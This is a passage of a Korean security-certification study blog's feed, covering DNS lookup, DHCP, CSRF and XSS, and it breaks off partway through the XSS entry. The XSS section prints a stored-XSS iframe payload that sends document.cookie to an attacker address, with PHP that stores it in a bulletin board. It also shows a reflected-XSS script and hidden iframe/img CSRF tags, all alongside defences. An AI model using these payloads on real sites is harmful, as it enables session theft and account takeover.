사용자 DNS 클라이언트 소프트웨어 PC 내 Resolver 가 PC 내 Cache 확인 Resolver 가 로컬네임서버에 (Recursive DNS Server) 재귀적 질의 로컬네임서버가 Cache 확인 반복적 질의 로컬네임서버가 루트서버에 질의 루트서버가 .edu 네임서버 주소를 전달 로컬네임서버가 .edu 네임서버에 질의 .edu 네임서버가 .googleex 네임서버 주소를 전달 로컬네임서버가 .googleex 네임서버에 질의 .googleex 네임서버가 comps.googleex.edu 네임서버 주소를 전달 로컬네임서버가 comps.googleex.edu 네임서버에 질의 comps.googleex.edu IP 주소를 전달 재귀적 질의 로컬네임서버가 Cache 갱신 로컬네임서버가 Resolver 에게 IP 전달 Resolver 가 Cache 갱신 Resolver 가 사용자에게 IP 주소를 전달 사용자 브라우저가 IP 주소로 HTTP 요청</summary></entry><entry><title type="html">정보보안 - DHCP(Dynamic Host Configuration Protocol)</title><link href="https://bluesplatter.com/is_certification/IS-Application-DHCP/" rel="alternate" type="text/html" title="정보보안 - DHCP(Dynamic Host Configuration Protocol)" /><published>2021-07-08T21:00:00+09:00</published><updated>2021-07-08T21:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Application-DHCP</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Application-DHCP/">&lt;h1 id=&quot;dhcp-dynamic-host-configuration-protocol&quot;&gt;DHCP (Dynamic Host Configuration Protocol)&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;네트워크 통신
    &lt;ul&gt;
      &lt;li&gt;TCP/IP 기반 네트워크 노드 (컴퓨터, host) 는 자신의 IP를 알아야 함
        &lt;ul&gt;
          &lt;li&gt;IPv4 클래스 : A, B, C, D&lt;/li&gt;
          &lt;li&gt;Classless 주소체계 : 서브넷 마스크 필요&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;외부네트워크와 통신하기 위해 디폴트 라우터 주소나 이름과 네임서버 주소를 알고 있어야 함&lt;/li&gt;
      &lt;li&gt;네트워크에 접속한 모든 컴퓨터가 알아야 할 정보
        &lt;ul&gt;
          &lt;li&gt;자신의 IP 주소&lt;/li&gt;
          &lt;li&gt;라우터 IP 주소&lt;/li&gt;
          &lt;li&gt;네임서버 IP 주소&lt;/li&gt;
          &lt;li&gt;서브넷 마스크&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;네트워크 역사
    &lt;ul&gt;
      &lt;li&gt;RARP =&amp;gt; BOOTP (Bootstrap) =&amp;gt; DHCP (동적 호스트 설정 프로토콜)&lt;/li&gt;
      &lt;li&gt;RARP (Reverse Address Resolution Protocol)
        &lt;ul&gt;
          &lt;li&gt;자신의 IP를 모를 때 이용&lt;/li&gt;
          &lt;li&gt;인터넷 초창기에 부팅된 컴퓨터의 IP주소 제공&lt;/li&gt;
          &lt;li&gt;물리주소 (Mac Address) 를 IP 주소로 변환&lt;/li&gt;
          &lt;li&gt;ARP : IP 주소를 물리주소 (Mac Address) 로 바꿔주는 역할&lt;/li&gt;
          &lt;li&gt;현재 사용하지 않음
            &lt;ul&gt;
              &lt;li&gt;IP 주소만을 제공 (라우터, 네임서버 IP나 서브넷 마스크를 모름)&lt;/li&gt;
              &lt;li&gt;ARP 서버가 각 네트워크 망에 존재해야 함&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;BOOTP (Bootstrap)
        &lt;ul&gt;
          &lt;li&gt;RARP의 2가지 단점을 보완한 클라이언트/서버 형태의 프로토콜&lt;/li&gt;
          &lt;li&gt;인터넷 상에 BOOTP 서버 존재
            &lt;ul&gt;
              &lt;li&gt;4가지 정보 항목 (자신, 라우터, 네임서버 IP, 서브넷 마스크) 모두 제공&lt;/li&gt;
              &lt;li&gt;정적 설정 프로토콜&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;포트번호 67 (Server), 68 (Client) 사용 =&amp;gt; DHCP 로 사용 가능&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;DHCP (Dynamic Host Configuration Protocol)
        &lt;ul&gt;
          &lt;li&gt;UDP 기반 프로토콜&lt;/li&gt;
          &lt;li&gt;서버가 네트워크 클라이언트에게 IP주소를 실시간으로 부여&lt;/li&gt;
          &lt;li&gt;IP 주소가 수동으로 설정되는 정적 IP주소와는 다르게, 사용 가능한 IP주소를 자동으로 확인&lt;/li&gt;
          &lt;li&gt;클라이언트/서버 형태의 응용계층 프로토콜&lt;/li&gt;
          &lt;li&gt;처음 부팅된 컴퓨터나 디스크가 없는 컴퓨터에게 4개의 정보를 제공&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;장점
    &lt;ul&gt;
      &lt;li&gt;네트워크 설계 변경 / 구성 변경이 쉬움
        &lt;ul&gt;
          &lt;li&gt;DHCP 서버에서 변경&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;IP 절약&lt;/li&gt;
      &lt;li&gt;관리 용이 (TCP/IP 설정을 따로 할 필요없음)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;단점
    &lt;ul&gt;
      &lt;li&gt;IP 없는 클라이언트 부팅 시 네트워크 상의 DHCP 서버에 IP 요청 브로드캐스트
        &lt;ul&gt;
          &lt;li&gt;네트워크 성능 저하&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;전원이 켜져있는 호스트에게 IP 할당
        &lt;ul&gt;
          &lt;li&gt;IP 낭비&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;IP 임대기간동안 다른 단말기에 해당 IP가 할당되지 않음
        &lt;ul&gt;
          &lt;li&gt;IP 낭비&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;호스트가 너무 많은 경우 서버 과부하가 발생&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;DHCP 동작과정
    &lt;ul&gt;
      &lt;li&gt;Client -&amp;gt; Server
        &lt;ul&gt;
          &lt;li&gt;Client 자신의 IP를 모르는 상태&lt;/li&gt;
          &lt;li&gt;Server : 192.168.172.10 으로 가정&lt;/li&gt;
          &lt;li&gt;DHCPDISCOVER 메시지 전송 (UDP)
            &lt;ul&gt;
              &lt;li&gt;Client IP : 0.0.0.0&lt;/li&gt;
              &lt;li&gt;전송지 : 255.255.255.255&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Client &amp;lt;- Server
        &lt;ul&gt;
          &lt;li&gt;DHCPOFFER 메시지 전송
            &lt;ul&gt;
              &lt;li&gt;여러 개의 IP 주소를 제안&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Client -&amp;gt; Server
        &lt;ul&gt;
          &lt;li&gt;Client 는 IP 주소를 선택&lt;/li&gt;
          &lt;li&gt;DHCPREQUEST&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Client &amp;lt;- Server
        &lt;ul&gt;
          &lt;li&gt;DHCPACK&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;IP 주소가 마음에 안 들 경우 반복&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="어플리케이션" /><summary type="html">DHCP (Dynamic Host Configuration Protocol) 네트워크 통신 TCP/IP 기반 네트워크 노드 (컴퓨터, host) 는 자신의 IP를 알아야 함 IPv4 클래스 : A, B, C, D Classless 주소체계 : 서브넷 마스크 필요 외부네트워크와 통신하기 위해 디폴트 라우터 주소나 이름과 네임서버 주소를 알고 있어야 함 네트워크에 접속한 모든 컴퓨터가 알아야 할 정보 자신의 IP 주소 라우터 IP 주소 네임서버 IP 주소 서브넷 마스크 네트워크 역사 RARP =&amp;gt; BOOTP (Bootstrap) =&amp;gt; DHCP (동적 호스트 설정 프로토콜) RARP (Reverse Address Resolution Protocol) 자신의 IP를 모를 때 이용 인터넷 초창기에 부팅된 컴퓨터의 IP주소 제공 물리주소 (Mac Address) 를 IP 주소로 변환 ARP : IP 주소를 물리주소 (Mac Address) 로 바꿔주는 역할 현재 사용하지 않음 IP 주소만을 제공 (라우터, 네임서버 IP나 서브넷 마스크를 모름) ARP 서버가 각 네트워크 망에 존재해야 함 BOOTP (Bootstrap) RARP의 2가지 단점을 보완한 클라이언트/서버 형태의 프로토콜 인터넷 상에 BOOTP 서버 존재 4가지 정보 항목 (자신, 라우터, 네임서버 IP, 서브넷 마스크) 모두 제공 정적 설정 프로토콜 포트번호 67 (Server), 68 (Client) 사용 =&amp;gt; DHCP 로 사용 가능 DHCP (Dynamic Host Configuration Protocol) UDP 기반 프로토콜 서버가 네트워크 클라이언트에게 IP주소를 실시간으로 부여 IP 주소가 수동으로 설정되는 정적 IP주소와는 다르게, 사용 가능한 IP주소를 자동으로 확인 클라이언트/서버 형태의 응용계층 프로토콜 처음 부팅된 컴퓨터나 디스크가 없는 컴퓨터에게 4개의 정보를 제공 장점 네트워크 설계 변경 / 구성 변경이 쉬움 DHCP 서버에서 변경 IP 절약 관리 용이 (TCP/IP 설정을 따로 할 필요없음) 단점 IP 없는 클라이언트 부팅 시 네트워크 상의 DHCP 서버에 IP 요청 브로드캐스트 네트워크 성능 저하 전원이 켜져있는 호스트에게 IP 할당 IP 낭비 IP 임대기간동안 다른 단말기에 해당 IP가 할당되지 않음 IP 낭비 호스트가 너무 많은 경우 서버 과부하가 발생 DHCP 동작과정 Client -&amp;gt; Server Client 자신의 IP를 모르는 상태 Server : 192.168.172.10 으로 가정 DHCPDISCOVER 메시지 전송 (UDP) Client IP : 0.0.0.0 전송지 : 255.255.255.255 Client &amp;lt;- Server DHCPOFFER 메시지 전송 여러 개의 IP 주소를 제안 Client -&amp;gt; Server Client 는 IP 주소를 선택 DHCPREQUEST Client &amp;lt;- Server DHCPACK IP 주소가 마음에 안 들 경우 반복</summary></entry><entry><title type="html">정보보안 - CSRF(Cross Site Request Forgery)</title><link href="https://bluesplatter.com/is_certification/IS-Application-CSRF/" rel="alternate" type="text/html" title="정보보안 - CSRF(Cross Site Request Forgery)" /><published>2021-07-08T19:00:00+09:00</published><updated>2021-07-08T19:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Application-CSRF</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Application-CSRF/">&lt;h1 id=&quot;csrf-cross-site-request-forgery&quot;&gt;CSRF (Cross Site Request Forgery)&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;개요
    &lt;ul&gt;
      &lt;li&gt;사용자의 브라우저에서 해당 사용자의 권한으로 어떤 기능을 수행하도록 만드는것&lt;/li&gt;
      &lt;li&gt;XSS의 취약점이 존재할 시 CSRF의 취약점이 존재할 수 있는 확률이 90% 이상임&lt;/li&gt;
      &lt;li&gt;공격자가 의도한대로 수정, 삭제, 등록하도록 하는 방법&lt;/li&gt;
      &lt;li&gt;XSS 는 사용자의 PC에서 공격이 이루어지나 CSRF는 정상적인 사용자가 서버에 공격자가 의도한 요청을 하도록 만드는 것&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;과정
    &lt;ul&gt;
      &lt;li&gt;공격자가 웹서버 (CSRF 취약점 존재 - 정상/비정상 요청을 구분하지 못함) 에 조작된 요청 (비밀번호 수정 등) 을 담은 게시물을 등록&lt;/li&gt;
      &lt;li&gt;웹서버는 게시물을 등록&lt;/li&gt;
      &lt;li&gt;희생자는 조작된 게시물을 열람&lt;/li&gt;
      &lt;li&gt;웹서버는 희생자의 권한으로 조작된 요청 (비밀번호 수정 등) 을 처리
        &lt;ul&gt;
          &lt;li&gt;희생자의 비밀번호가 공격자가 입력한 비밀번호로 수정됨&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;웹서버가 희생자에게 응답메시지(페이지) 전송&lt;/li&gt;
      &lt;li&gt;(사용자가 로그인한 상태에서 접속가능한 웹페이지나 동작가능한 스크립트를 공격대상으로 함 - modify.asp, modify.php … )&lt;/li&gt;
      &lt;li&gt;(IMG, EMBED 태그, javascript 등이 공격대상이 됨)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;CSRF 의 공격 예
    &lt;ul&gt;
      &lt;li&gt;자동으로 게시판 글 추가/삭제&lt;/li&gt;
      &lt;li&gt;자동으로 댓글 달기&lt;/li&gt;
      &lt;li&gt;자동으로 친구 등록&lt;/li&gt;
      &lt;li&gt;강제로 회원 탈퇴&lt;/li&gt;
      &lt;li&gt;자동으로 게시판 조회수 조작&lt;/li&gt;
      &lt;li&gt;자동으로 회원정보 변경&lt;/li&gt;
      &lt;li&gt;강제 Browsing 을 유도하는 공격
        &lt;ul&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe width=0 height=0 src=http://광고페이지&amp;gt;&lt;/code&gt;&lt;/li&gt;
          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;img src=http://광고페이지&amp;gt;&lt;/code&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;인증된 사용자 공격
        &lt;ul&gt;
          &lt;li&gt;희생자의 계좌에서 공격자의 계좌로 입금&lt;/li&gt;
          &lt;li&gt;ID/PW 필요없이 가능한 공격
            &lt;ul&gt;
              &lt;li&gt;대다수의 사이트는 한번 로그인을 하면 세션쿠키로 인증관리를 한다.&lt;/li&gt;
              &lt;li&gt;XSS : 세션쿠키를 가로채서 공격자가 정상적인 사용자로 위장가능&lt;/li&gt;
              &lt;li&gt;CSRF : 세션쿠키를 가로챌 필요 없이 CSRF 요청페이지를 수행하기만 하면 됨&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;대응책
    &lt;ul&gt;
      &lt;li&gt;정상적인 요청과 비정상적인 요청을 판별할 수 있게 함 (토큰 사용)
        &lt;ul&gt;
          &lt;li&gt;예측이 어려운 토큰을 사용&lt;/li&gt;
          &lt;li&gt;사용자가 요청한 내용이 위조되었는지 여부를 판별하기 위함&lt;/li&gt;
          &lt;li&gt;세션정보의 토큰 값과 요청내용 내 토큰 값이 같은지 비교&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;XSS, CSRF 의 취약점 제거&lt;/li&gt;
      &lt;li&gt;입력화면 폼 작성시 GET 보다 POST 사용&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>HY03</name><email>hyunik03@gmail.com</email></author><category term="IS_Certification" /><category term="정보보안기사" /><category term="어플리케이션" /><summary type="html">CSRF (Cross Site Request Forgery) 개요 사용자의 브라우저에서 해당 사용자의 권한으로 어떤 기능을 수행하도록 만드는것 XSS의 취약점이 존재할 시 CSRF의 취약점이 존재할 수 있는 확률이 90% 이상임 공격자가 의도한대로 수정, 삭제, 등록하도록 하는 방법 XSS 는 사용자의 PC에서 공격이 이루어지나 CSRF는 정상적인 사용자가 서버에 공격자가 의도한 요청을 하도록 만드는 것 과정 공격자가 웹서버 (CSRF 취약점 존재 - 정상/비정상 요청을 구분하지 못함) 에 조작된 요청 (비밀번호 수정 등) 을 담은 게시물을 등록 웹서버는 게시물을 등록 희생자는 조작된 게시물을 열람 웹서버는 희생자의 권한으로 조작된 요청 (비밀번호 수정 등) 을 처리 희생자의 비밀번호가 공격자가 입력한 비밀번호로 수정됨 웹서버가 희생자에게 응답메시지(페이지) 전송 (사용자가 로그인한 상태에서 접속가능한 웹페이지나 동작가능한 스크립트를 공격대상으로 함 - modify.asp, modify.php … ) (IMG, EMBED 태그, javascript 등이 공격대상이 됨) CSRF 의 공격 예 자동으로 게시판 글 추가/삭제 자동으로 댓글 달기 자동으로 친구 등록 강제로 회원 탈퇴 자동으로 게시판 조회수 조작 자동으로 회원정보 변경 강제 Browsing 을 유도하는 공격 &amp;lt;iframe width=0 height=0 src=http://광고페이지&amp;gt; &amp;lt;img src=http://광고페이지&amp;gt; 인증된 사용자 공격 희생자의 계좌에서 공격자의 계좌로 입금 ID/PW 필요없이 가능한 공격 대다수의 사이트는 한번 로그인을 하면 세션쿠키로 인증관리를 한다. XSS : 세션쿠키를 가로채서 공격자가 정상적인 사용자로 위장가능 CSRF : 세션쿠키를 가로챌 필요 없이 CSRF 요청페이지를 수행하기만 하면 됨 대응책 정상적인 요청과 비정상적인 요청을 판별할 수 있게 함 (토큰 사용) 예측이 어려운 토큰을 사용 사용자가 요청한 내용이 위조되었는지 여부를 판별하기 위함 세션정보의 토큰 값과 요청내용 내 토큰 값이 같은지 비교 XSS, CSRF 의 취약점 제거 입력화면 폼 작성시 GET 보다 POST 사용</summary></entry><entry><title type="html">정보보안 - XSS(Cross Site Script)</title><link href="https://bluesplatter.com/is_certification/IS-Application-XSS/" rel="alternate" type="text/html" title="정보보안 - XSS(Cross Site Script)" /><published>2021-07-05T19:00:00+09:00</published><updated>2021-07-05T19:00:00+09:00</updated><id>https://bluesplatter.com/is_certification/IS-Application-XSS</id><content type="html" xml:base="https://bluesplatter.com/is_certification/IS-Application-XSS/">&lt;h1 id=&quot;xsscross-site-script&quot;&gt;XSS(Cross Site Script)&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;개요
    &lt;ul&gt;
      &lt;li&gt;SQL Injection : 입력값 필터링이 되지 않아 발생&lt;/li&gt;
      &lt;li&gt;XSS (Cross Site Script) : 입력값 필터링이 되지 않아 발생&lt;/li&gt;
      &lt;li&gt;Form 입력 양식에 악의적인 스크립트를 작성하여 입력 혹은 URL 입력창에 스크립트를 작성하여 입력
        &lt;ul&gt;
          &lt;li&gt;웹서버에 입력&lt;/li&gt;
          &lt;li&gt;Javascript, ActiveX, VBscript, Flash파일 (swf) 등 삽입&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;공격자에게 개인정보, 쿠키정보 등을 전송, 피해자 PC에 악성코드 설치&lt;/li&gt;
      &lt;li&gt;다운로드 받은 html 문서 안에 javascript 등의 악성 스크립트가 포함&lt;/li&gt;
      &lt;li&gt;브라우저에서 자동 실행됨&lt;/li&gt;
      &lt;li&gt;Client 가 희생자가 됨&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;과정
    &lt;ul&gt;
      &lt;li&gt;공격자가 XSS 를 서버에 삽입 (XSS 취약점이 존재하는 서버)&lt;/li&gt;
      &lt;li&gt;희생자(클라이언트)가 서버의 XSS 에 접근&lt;/li&gt;
      &lt;li&gt;희생자가 서버의 XSS 스크립트가 포함된 문서를 다운로드&lt;/li&gt;
      &lt;li&gt;희생자의 PC에서 스크립트가 실행됨&lt;/li&gt;
      &lt;li&gt;악성코드가 설치되거나 정보가 공격자에게 전달됨&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;방식
    &lt;ul&gt;
      &lt;li&gt;Stored XSS (저장형 XSS)
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;가장 일반적인 형태의 XSS&lt;/li&gt;
              &lt;li&gt;공격자가 게시판, 자료실 등에 스크립트를 입력하여 저장 (DB 저장)&lt;/li&gt;
              &lt;li&gt;희생자가 게시물을 열람하는 순간 악성 스크립트가 클라이언트에서 실행됨&lt;/li&gt;
              &lt;li&gt;서버 취약점 점검이 필요&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;공격방식
            &lt;ul&gt;
              &lt;li&gt;주로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; 태그를 이용함
                &lt;ul&gt;
                  &lt;li&gt;최근에는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; 태그를 사용자제&lt;/li&gt;
                  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;iframe width=0 height=0 src=&quot;javascript:document.location.href=&apos;http://192.168.10.1/abc/a.php?cookie=document.cookie&apos;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;
                    &lt;ul&gt;
                      &lt;li&gt;공격자의 주소로 cookie 값을 전송
                        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $content = &quot;&amp;lt;iframe width=0 height=0 src=&quot;javascript:document.location.href=&apos;http://192.168.10.1/abc/a.php?cookie=document.cookie&apos;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&quot;;
  $query = &quot;insert into $bbs(id, name, subject, content)
  values (&apos;$id&apos;, &apos;$name&apos;, &apos;$subject&apos;, &apos;$content&apos;)&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                        &lt;/div&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;대응방법
            &lt;ul&gt;
              &lt;li&gt;XSS 공격은 HTML, 스크립트 태그를 사용&lt;/li&gt;
              &lt;li&gt;HTML 특수문자
                &lt;ul&gt;
                  &lt;li&gt;htmlspecialchars() 함수 이용 (PHP)
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$content = htmlspecialchars($content,ENT_QUOTES);&lt;/code&gt;
                        &lt;ul&gt;
                          &lt;li&gt;ENT_QUOTES : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; 모두 변환&lt;/li&gt;
                          &lt;li&gt;사용하지 않을 경우 : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; 만 변환&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                      &lt;li&gt;함수 사용시 태그 내용이 그대로 출력됨&lt;/li&gt;
                      &lt;li&gt;HTML 특수문자를 escape 처리하여 일반문자 (HTML Entity) 로 치환
                        &lt;ul&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;lt;&lt;/code&gt;&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;gt;&lt;/code&gt;&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;amp;&lt;/code&gt;&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;quot;&lt;/code&gt;&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#039;&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#x27;&lt;/code&gt; (16진수)&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#40;&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#x28;&lt;/code&gt; (16진수)&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;)&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#41;&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#x29;&lt;/code&gt; (16진수)&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#x23;&lt;/code&gt; (16진수)&lt;/li&gt;
                          &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;#x2F;&lt;/code&gt; (16진수)&lt;/li&gt;
                          &lt;li&gt;소스보기 시 일반문자로 보이게 됨 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;lt;&lt;/code&gt; 등)&lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;strip_tags() 이용
                    &lt;ul&gt;
                      &lt;li&gt;스크립트 태그를 제거&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Reflected XSS (반사형 XSS)
        &lt;ul&gt;
          &lt;li&gt;개요
            &lt;ul&gt;
              &lt;li&gt;악성스크립트를 서버 DB에 저장하지 않음&lt;/li&gt;
              &lt;li&gt;악성스크립트를 직접 클릭하도록 유도
                &lt;ul&gt;
                  &lt;li&gt;공격자가 악성스크립트 링크를 포함한 메일 전송&lt;/li&gt;
                  &lt;li&gt;희생자는 메일 링크 클릭
                    &lt;ul&gt;
                      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;url.php?q=스크립트&lt;/code&gt; : 희생자가 알아볼 수 없도록 처리&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;희생자가 링크를 클릭하여 웹서버에 요청&lt;/li&gt;
                  &lt;li&gt;서버는 스크립트의 내용을 처리하지 않고 그대로 응답 (서버 처리 스크립트 X)
                    &lt;ul&gt;
                      &lt;li&gt;일반적으로 서버에 검색내용을 입력
                        &lt;ul&gt;
                          &lt;li&gt;입력값 예 : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.test.com/search/?q=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
                          &lt;li&gt;검색 결과 있는 경우
                            &lt;ul&gt;
                              &lt;li&gt;결과값을 사용자에게 전달&lt;/li&gt;
                            &lt;/ul&gt;
                          &lt;/li&gt;
                          &lt;li&gt;검색 결과 없는 경우
                            &lt;ul&gt;
                              &lt;li&gt;사용자 입력값을 그대로 HTML 에 포함하여 응답&lt;/li&gt;
                              &lt;li&gt;요청값을 서버에서 반사시킴&lt;/li&gt;
                              &lt;li&gt;응답 예 :
                                &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &amp;lt;h2&amp;gt;&amp;lt;span class=&apos;&apos;&amp;gt;Search Result&amp;lt;/span&amp;gt;&amp;lt;br/&amp;gt;
  Search:&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
  &amp;lt;/body&amp;gt;&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;                                &lt;/div&gt;
                              &lt;/li&gt;
                            &lt;/ul&gt;
                          &lt;/li&gt;
                        &lt;/ul&gt;
                      &lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                  &lt;li&gt;희생자는 공격자에게 자신의 정보 전달
                    &lt;ul&gt;
                      &lt;li&gt;응답페이지가 희생자에게 전달되면서 스크립트 실행&lt;/li&gt;
                    &lt;/ul&gt;
                  &lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;공격방식
            &lt;ul&gt;
              &lt;li&gt;공격자는 XSS 취약점이 있는 사이트를 발견&lt;/li&gt;
              &lt;li&gt;중요 정보를 획득할 수 있는 공격용 악성 URL을 생성&lt;/li&gt;
              &lt;li&gt;이 URL을 이메일을 이용하여 배포&lt;/li&gt;
              &lt;li&gt;희생자가 URL을 클릭시 악성스크립트가 희생자에 반사되어 공격을 당하게 됨&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;대응방법
            &lt;ul&gt;
              &lt;li&gt;XSS 취약점이 있는 사이트에서 특수문자를 일반문자 (HTML Entity) 로 치환&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
